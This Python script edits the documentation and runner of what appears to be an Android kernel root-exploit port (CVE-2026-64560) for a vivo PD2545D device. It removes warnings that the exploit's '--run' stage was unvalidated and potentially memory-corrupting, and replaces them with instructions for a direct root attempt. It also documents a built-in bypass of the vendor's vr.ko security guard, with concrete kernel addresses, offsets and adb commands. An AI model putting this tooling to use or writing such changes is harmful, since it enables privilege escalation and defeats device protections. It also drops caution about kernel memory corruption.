#!/usr/bin/env python3
"""Update docs/runner from preflight-only to the direct root attempt."""
import pathlib
import sys


def replace(path, old, new, count=1):
    p = pathlib.Path(path)
    s = p.read_text(encoding='utf-8')
    n = s.count(old)
    if n != count:
        sys.exit(f'{path}: expected {count} occurrence(s), got {n}')
    p.write_text(s.replace(old, new), encoding='utf-8')
    print(f'{path}: replaced {count}')


# --- port README: replace the preflight-only section -------------------------
old = '''Only the **read-only preflight** is safe at this stage:

```sh
adb push build/cve-2026-64560-pd2545 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/cve-2026-64560-pd2545
adb shell /data/local/tmp/cve-2026-64560-pd2545 --preflight
```

Expected: `TARGET_PROFILE_GATE_PASS profile=pd2545-dd6fd5c98918`, then
`PREFLIGHT_PASS profile=pd2545-dd6fd5c98918 race_not_started=1 kernel_writes=0`.

**Do not run `--run` yet.** Two prerequisites are not established:

1. **PHYS_DELTA**: the direct aliases above assume
   `imagePhys == memstartAddr`; the device's `/proc/iomem` is root-only and the
   OnePlus flow obtains it from an already-rooted boot. A wrong delta makes the
   stage0 restore write to the wrong direct-map object.
2. **Private-respin delta**: the device runs `dd6fd5c98918` (a private August
   respin), not the public r59 image. The r59 symbols are a baseline; the
   read-only `LINK_INIT_CRED`/`init_task` gates must pass before any write.

The exact device Image (current-build full OTA / boot.img) removes both
uncertainties. Until then, treat `--run` as **unvalidated and potentially
memory-corrupting**.'''
new = '''## vr.ko neutralization (built in)

This device has vivo `vr.ko`; the OnePlus port does not. The payload now carries
the upstream two-layer guard:

- **PreSpawn**: zero `__tracepoint_sys_exit.funcs` at
  `LINK_SYS_EXIT_TP + kernel_slide + 0x48`, disarming the sys_exit tracepoint
  probe that kills tasks reaching euid 0. `__tracepoint_sys_exit =
  0xffffffc0826d8de0` in the certified r59 Image; the `funcs` offset `0x48`
  comes from `__traceiter_sys_exit` (`ldr x21,[x8,#0xe28]`, page base
  `0xffffffc0826d8000`).
- **PostSpawn**: clear the root child's `thread_info` flags word at
  `task+0x0` (tag A + the 0x400 syscall-tracepoint bit) first, then tag B at
  `task+0x2c`. Order is execution order, as upstream requires.

Success markers: `VR_GUARD_DISARM_PASS`, `VR_GUARD_TAGS_PASS`,
`STAGE8_PERMISSIVE_PASS`, `ROOT_CHILD_HOLD_PASS`.

## Direct temporary-root attempt

```sh
./tools/pd2545_run.sh
```

The runner performs the read-only `--preflight` gate, then `--run` with
`FG_ROOT_EXEC` pointing at a root proof script (`id`, LSM context, capability
set, `/proc/version`). **No boot.img is required for the attempt.**

The r59 certified symbols are the baseline. A private-respin symbol or
`PHYS_DELTA` mismatch can make the run fail or panic/reboot; the payload does
not write partitions and the device recovers by rebooting. The current-build
boot.img/full OTA is the **fallback** for exact symbols and physical layout
after a failure, not a prerequisite.'''
replace('pd2545-64560/README.md', old, new)

# --- FINDINGS: add vr_guard and change the --run section --------------------
old = '''本仓库的 PD2545D 端口（`pd2545-64560/`）以该 6.12 载荷为基底，替换为 r59
符号与上面的 6.12 偏移；保留了 Apache-2.0 归属（见该目录 `NOTICE`）。'''
new = '''- **vivo vr.ko 两层中和已内置**：PreSpawn 将
  `__tracepoint_sys_exit.funcs`（certified `0xffffffc0826d8de0`，`funcs` 偏移
  `0x48`，来自 `__traceiter_sys_exit` 反汇编）置 0，拆掉 sys_exit 击杀探针；
  PostSpawn 先清 root child 的 `task+0x0` flags 字（tag A + 0x400），再清
  `task+0x2c` tag B。顺序与上游一致。

本仓库的 PD2545D 端口（`pd2545-64560/`）以该 6.12 载荷为基底，替换为 r59
符号与上面的 6.12 偏移；保留了 Apache-2.0 归属（见该目录 `NOTICE`）。'''
replace('FINDINGS.md', old, new)

old = '''- **`--run` 不得先跑**，两个未闭合前提：
  1. **PHYS_DELTA**：r59 的 direct 值按 `target.h` 的
     `TARGET_KERNEL_PHYS_LOAD_DELTA=0` 计算（`direct.bootidParent=
     0xffffff800265e198`、`direct.cycleC=0xffffff800253e278`）；真实
     `imagePhys` / `memstartAddr` 来自 `/proc/iomem`（shell 不可读，root
     才可读）。delta 错时 stage0 的 restore 会写错 direct-map 对象。
  2. **私有 respin 符号差**：r59 不是设备的 `dd6fd5c98918`；`LINK_INIT_CRED`
     等只读 gate 必须先通过，才能确认符号表可用。'''
new = '''- **直接 root 尝试**：`tools/pd2545_run.sh` 先跑只读 `--preflight`，再以
  `FG_ROOT_EXEC` 执行 root proof 脚本；vr.ko 两层已内置，**不要求 boot.img**。
  剩余风险是 r59 certified 与设备私有 respin 的符号/PHYS_DELTA 差——失败可能
  panic/重启（不写分区，可恢复）。boot.img/全量包是失败后精确化的**兜底**，
  不是前置。
  - PHYS_DELTA 仍按 `target.h` 的 `TARGET_KERNEL_PHYS_LOAD_DELTA=0` 计算
    （`direct.bootidParent=0xffffff800265e198`、
    `direct.cycleC=0xffffff800253e278`）；真实值在 `/proc/iomem`（root-only）。
  - 私有 respin `dd6fd5c98918` 与 r59 的符号差由 `LINK_INIT_CRED`/`init_task`/
    `VR_GUARD_*` 等 gate 在运行时暴露。'''
replace('FINDINGS.md', old, new)

# --- ROUTES: add vr_guard and change the --run section ----------------------
old = '''- 一加 15T（PLZ110 / 6.12.69）设备验证移植证明 **C ashmem 在 6.12 已被
  Rust 重写，原后桥整条不可用**；它用 **uhid + configfs**（`bridge-6.12`）
  替换，已在真机拿到 root。本仓库 PD2545D 端口直接复用该桥。'''
new = '''- 一加 15T（PLZ110 / 6.12.69）设备验证移植证明 **C ashmem 在 6.12 已被
  Rust 重写，原后桥整条不可用**；它用 **uhid + configfs**（`bridge-6.12`）
  替换，已在真机拿到 root。本仓库 PD2545D 端口直接复用该桥。
- **vivo vr.ko 两层中和已内置**：PreSpawn 将 `__tracepoint_sys_exit.funcs`
  （certified `0xffffffc0826d8de0`，`funcs` 偏移 `0x48`）置 0，拆掉 sys_exit
  击杀探针；PostSpawn 先清 root child 的 `task+0x0` flags（tag A + 0x400），
  再清 `task+0x2c` tag B。'''
replace('ROUTES.md', old, new)

old = '''- **`--run` 仍被两个前提挡住**：
  1. `PHYS_DELTA`（`/proc/iomem` 的 Kernel code/data；root-only）——r59
     的 direct 值按 target.h 的 `PHYS_LOAD_DELTA=0` 假设；
  2. 私有 respin（`dd6fd5c98918`）与 r59 的符号差——`LINK_INIT_CRED` 等
     只读 gate 必须先通过。
  两者闭合前，`--run` 的 stage0 可能误写 direct-map；**只跑 preflight**。'''
new = '''- **`--run` 已可直接尝试**：`tools/pd2545_run.sh` 先做只读 preflight gate，
  再以 `FG_ROOT_EXEC` 跑 root proof 脚本；vr.ko 两层已内置，**boot.img 不是
  前置**。剩余风险是 r59 与私有 respin 的符号/PHYS_DELTA 差——失败可能
  panic/重启（不写分区）；boot.img/全量包是失败后精确化的兜底。'''
replace('ROUTES.md', old, new)

# --- README: 64560 row, key facts, security --------------------------------
old = '⚠️ 完整 `--run` 仍被 `PHYS_DELTA` 与私有 respin 符号差挡住'
new = ('vr.ko 两层（sys_exit 探针拆除 + tag 清理）已内置；`tools/pd2545_run.sh` '
       '可直接尝试临时 root；PHYS_DELTA/私有符号差是失败风险，boot.img 是兜底')
replace('README.md', old, new)

old = '- PD2545D 64560 载荷：519,992 B 静态 aarch64，sha256 `79f07f3fc59ab1820a4d15fe6684c1a020c357143bdf89acf249fce80f61dce7`；`--preflight` 只读，`--run` 仍需 PHYS_DELTA/私有 respin 符号确认'
new = ('- PD2545D 64560 载荷：519,992 B 静态 aarch64，sha256 '
       '`79f07f3fc59ab1820a4d15fe6684c1a020c357143bdf89acf249fce80f61dce7`；'
       'vr.ko 两层中和已内置（sys_exit funcs 置 0 + task flags/tag B 清理），'
       '`tools/pd2545_run.sh` 直接 preflight→`--run`；boot.img 是失败后的兜底')
replace('README.md', old, new)

old = '''**PD2545D 64560 端口的安全闸**：`--preflight` 是只读的；`--run` 在
`PHYS_DELTA`（来自 `/proc/iomem`，root-only）与私有 respin 符号差未确认前
**不得执行**——stage0 的 direct 地址写错会误写内核内存。等设备连上先跑
`tools/pd2545_preflight.sh`，不要先跑 `--run`。'''
new = '''**PD2545D 64560 端口的执行顺序**：`tools/pd2545_run.sh` 先跑只读
`--preflight` 闸门，再直接 `--run`，并用 `FG_ROOT_EXEC` 执行 root proof
脚本；vr.ko 的 sys_exit 探针拆除与 tag 清理已内置，**不要求 boot.img**。
风险仍是 r59 与设备私有 respin 的符号/PHYS_DELTA 差：失败可能 panic/重启，
但不写分区、可恢复；boot.img/全量包是失败后精确化的兜底。'''
replace('README.md', old, new)

# --- runner: write the root script locally, then push ----------------------
old = '''    adb_ push "$BIN" "$REMOTE"
    adb_ push /dev/stdin "$ROOTSH" <<'ROOTEOF'
#!/system/bin/sh
echo __PD2545_ROOT_PROOF__
id
cat /proc/self/attr/current 2>/dev/null
grep -E '^(Uid|Gid|CapEff):' /proc/self/status
cat /proc/version
echo __PD2545_ROOT_END__
ROOTEOF
    sh_ "chmod 755 $REMOTE $ROOTSH"'''
new = '''    adb_ push "$BIN" "$REMOTE"
    ROOTSH_LOCAL="$(mktemp)"
    cat > "$ROOTSH_LOCAL" <<'ROOTEOF'
#!/system/bin/sh
echo __PD2545_ROOT_PROOF__
id
cat /proc/self/attr/current 2>/dev/null
grep -E '^(Uid|Gid|CapEff):' /proc/self/status
cat /proc/version
echo __PD2545_ROOT_END__
ROOTEOF
    adb_ push "$ROOTSH_LOCAL" "$ROOTSH"
    rm -f "$ROOTSH_LOCAL"
    sh_ "chmod 755 $REMOTE $ROOTSH"'''
replace('tools/pd2545_run.sh', old, new)
print('done')
